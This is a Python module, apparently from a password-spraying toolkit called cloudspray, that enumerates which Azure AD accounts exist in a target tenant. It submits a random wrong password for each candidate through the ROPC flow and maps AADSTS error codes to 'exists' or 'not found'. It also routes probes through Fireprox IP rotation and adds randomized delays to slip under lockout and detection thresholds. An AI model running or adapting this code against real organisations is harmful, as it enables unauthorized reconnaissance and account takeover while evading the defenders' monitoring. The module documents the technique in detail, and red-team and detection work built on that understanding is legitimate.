"""Login-based user enumeration via ROPC authentication.

Noisy technique that generates failed login events in the target tenant's logs.
Attempts authentication with a known-wrong password and interprets the resulting
AADSTS error code to determine whether the user account exists.

How it works:
    Azure AD returns distinct error codes depending on *why* an authentication
    attempt failed. By submitting a deliberately wrong password (a random UUID)
    for each candidate email, the AADSTS error code in the response reveals
    whether the account exists:

    - **AADSTS50126** (``INVALID_PASSWORD``) -- the password was wrong, which
      means the account itself is valid. This is the primary "exists" signal.
    - **AADSTS50034** (``USER_NOT_FOUND``) -- no account with that email
      exists in the tenant.
    - **AADSTS50053** (``ACCOUNT_LOCKED``) -- the account is locked out,
      confirming it exists.
    - **AADSTS50057** (``ACCOUNT_DISABLED``) -- the account is disabled but
      still present in the directory.
    - **MFA / CA / expired password codes** -- authentication got far enough
      to evaluate policy, proving the account exists.
    - **SUCCESS** -- the random UUID happened to be the right password (nearly
      impossible, but handled for completeness).

    This technique reuses the same ``Authenticator`` class used by the password
    spraying module, ensuring consistent ROPC implementation and error-code
    parsing across the tool.

Why this technique is useful:
    Login enumeration is the most reliable method -- it works regardless of
    OneDrive provisioning, GetCredentialType throttling, or Teams external
    search policies. However, it is also the noisiest: every probe generates a
    failed sign-in event in the target tenant's Azure AD logs, which may
    trigger alerts. Use this as a last resort when quieter techniques are
    unavailable or inconclusive.

Dependencies:
    - ``cloudspray.spray.auth.Authenticator`` -- handles the actual ROPC
      token request and parses the AADSTS error code into an ``AuthResult``.
    - ``cloudspray.constants.error_codes.AuthResult`` -- enum of all
      recognized AADSTS outcomes.
    - ``cloudspray.state.db.StateDB`` -- result persistence.
    - ``cloudspray.reporting.console.ConsoleReporter`` -- live terminal output.
"""

import random
import time
import uuid

import requests

from cloudspray.constants.error_codes import AuthResult
from cloudspray.reporting.console import ConsoleReporter
from cloudspray.spray.auth import Authenticator
from cloudspray.state.db import StateDB
from cloudspray.state.models import EnumResult
from cloudspray.utils import normalize_email

METHOD_NAME = "login"

# AuthResult values that confirm the account exists. All of these codes mean
# Azure AD recognized the username and proceeded far enough into the
# authentication pipeline to evaluate the password, MFA policy, or account
# status -- none of which would happen for a nonexistent account.
_EXISTS_RESULTS = frozenset({
    AuthResult.INVALID_PASSWORD,            # wrong password, but account is real
    AuthResult.ACCOUNT_LOCKED,              # too many failed attempts, account exists
    AuthResult.ACCOUNT_DISABLED,            # admin-disabled account, still in directory
    AuthResult.VALID_PASSWORD_MFA_REQUIRED,  # password correct, needs MFA step
    AuthResult.VALID_PASSWORD_MFA_ENROLLMENT,  # password correct, MFA not yet set up
    AuthResult.VALID_PASSWORD_CA_BLOCKED,    # password correct, blocked by Conditional Access
    AuthResult.VALID_PASSWORD_EXPIRED,       # password correct but expired
    AuthResult.SUCCESS,                      # password was correct (astronomically unlikely)
})

# AuthResult values that definitively confirm the account does NOT exist.
_NOT_FOUND_RESULTS = frozenset({
    AuthResult.USER_NOT_FOUND,  # AADSTS50034: no matching account in the tenant
})


class LoginEnumerator:
    """Enumerate users via ROPC authentication with a deliberately wrong password.

    This is the noisiest enumeration technique: every probe generates a
    failed-login event in the target tenant's Azure AD sign-in logs. It should
    be used only when quieter methods (OneDrive, MSOL, Teams) are unavailable
    or have produced inconclusive results.

    The technique works by submitting a random UUID as the password for each
    candidate email via the ROPC (Resource Owner Password Credential) OAuth2
    flow. The resulting AADSTS error code is mapped to an existence
    determination through ``_classify_existence``.

    Key AADSTS codes:
        - AADSTS50126 -- invalid password (user exists)
        - AADSTS50034 -- user not found (account does not exist)
        - AADSTS50053 -- account locked (user exists)
        - AADSTS50057 -- account disabled (user exists)

    Usage example::

        enumerator = LoginEnumerator("contoso.com", db, reporter)
        valid = enumerator.enumerate(["john.smith", "jane.doe@contoso.com"])

    Args passed to ``__init__``:
        domain: Target tenant domain (e.g. ``contoso.com``).
        db: State database for persisting enumeration results.
        reporter: Console reporter for real-time output and debug messages.
        proxy_session: Optional pre-configured ``requests.Session`` for IP
            rotation via Fireprox. Strongly recommended to avoid IP-based
            lockouts since each probe is a real authentication attempt.
    """

    def __init__(
        self,
        domain: str,
        db: StateDB,
        reporter: ConsoleReporter,
        proxy_session: requests.Session | None = None,
    ):
        self._domain = domain
        self._db = db
        self._reporter = reporter
        # Reuse the same Authenticator the spray module uses, ensuring
        # consistent ROPC implementation and error-code parsing.
        self._authenticator = Authenticator(domain, proxy_session=proxy_session)

    def _classify_existence(self, auth_result: AuthResult) -> bool | None:
        """Map an ``AuthResult`` enum value to a user-existence determination.

        This is the decision logic that translates AADSTS error codes into a
        simple exists/not-exists/unknown signal. The mapping is maintained in
        the module-level ``_EXISTS_RESULTS`` and ``_NOT_FOUND_RESULTS``
        frozensets.

        Args:
            auth_result: The parsed result from the ROPC authentication attempt.

        Returns:
            ``True`` if the error code proves the account exists, ``False`` if
            it proves the account does not exist, or ``None`` if the code is
            unrecognized or ambiguous (e.g. network-level failures).
        """
        if auth_result in _EXISTS_RESULTS:
            return True
        if auth_result in _NOT_FOUND_RESULTS:
            return False
        return None

    def enumerate(self, usernames: list[str]) -> list[str]:
        """Attempt login with random wrong passwords to enumerate users.

        For each candidate, a random UUID is used as the password to guarantee
        a failed authentication. The AADSTS error code returned by Azure AD is
        then classified to determine whether the account exists.

        Unlike the MSOL and Teams enumerators, ambiguous results here are
        treated as "not found" rather than skipped, because every login
        attempt is already logged in the target tenant -- there is no benefit
        to retrying silently.

        Args:
            usernames: Candidate email addresses (or bare usernames, which
                will be normalized to ``user@domain``).

        Returns:
            List of email addresses confirmed to exist.

        Raises:
            No exceptions are raised; errors from the authenticator are
            mapped to ambiguous results and logged as debug messages.
        """
        confirmed: list[str] = []
        # Deduplicate while preserving the caller's ordering.
        usernames = list(dict.fromkeys(usernames))

        for username in usernames:
            email = normalize_email(username, self._domain)

            # A random UUID is effectively guaranteed to never be a real
            # password, ensuring we always trigger a "wrong password" error
            # rather than accidentally authenticating.
            fake_password = str(uuid.uuid4())

            attempt = self._authenticator.attempt(email, fake_password)
            existence = self._classify_existence(attempt.result)

            if existence is None:
                # Ambiguous codes (network errors, unrecognized AADSTS values)
                # are conservatively treated as "not found" rather than
                # skipped, since the login event was already recorded.
                self._reporter.debug(
                    f"Ambiguous result for {email}: {attempt.result.value}"
                )
                exists = False
            else:
                exists = existence

            if exists:
                confirmed.append(email)

            result = EnumResult(username=email, method=METHOD_NAME, exists=exists)
            self._db.record_enum_result(result)
            self._reporter.print_enum_result(email, exists, METHOD_NAME)

            # Delay between attempts to reduce detection risk and avoid
            # triggering smart-lockout thresholds.
            time.sleep(random.uniform(1.0, 3.0))

        return confirmed
